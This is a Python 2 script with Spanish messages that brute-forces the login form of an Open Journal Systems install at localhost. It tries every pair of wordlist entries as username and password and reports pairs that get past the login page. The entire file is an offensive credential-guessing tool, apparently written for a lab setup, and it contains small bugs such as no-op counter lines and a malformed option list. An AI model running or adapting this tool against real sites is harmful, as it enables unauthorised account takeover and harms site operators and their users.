import getopt
import sys
import  mechanize
from bs4 import BeautifulSoup
import urllib2


arg = ''

def bruteForce(arg):

	passwords = []
	i = 0
	j = 0

	fo = open(arg, 'r')
	for element in fo:
		passwords.append(element)
	fo.close()

	for i in range(0,len(passwords)):
		for j in range(0,len(passwords)):
			url = 'http://localhost/ojs302/index.php/index/login'
			br = mechanize.Browser()
			br.open(url)
			br.select_form(nr = 0 )
			br.form['username'] = passwords[i]
			br.form['password'] = passwords[j]
			br.submit()
			if url not in br.response().geturl():
				print "Credenciales correctas: \n" + passwords[i] + passwords[j]
				
				#print br.response().geturl()


			j + 1
		i + 1




def getParams(arg):
	try:
		opts, args = getopt.getopt(sys.argv[1:],'b:h', ['bruteforce=''help'])
	except getopt.GetoptError:
		help()

	for opt, arg in opts:	
		if opt in ('-b','--bruteforce'):
			bf = arg
			bruteForce(bf)
	
		
		elif opt in ('-h','--help'):
			print "prueba"
					
		else:
			print 'opcion no valida'
			sys.exit(2)


getParams(arg)





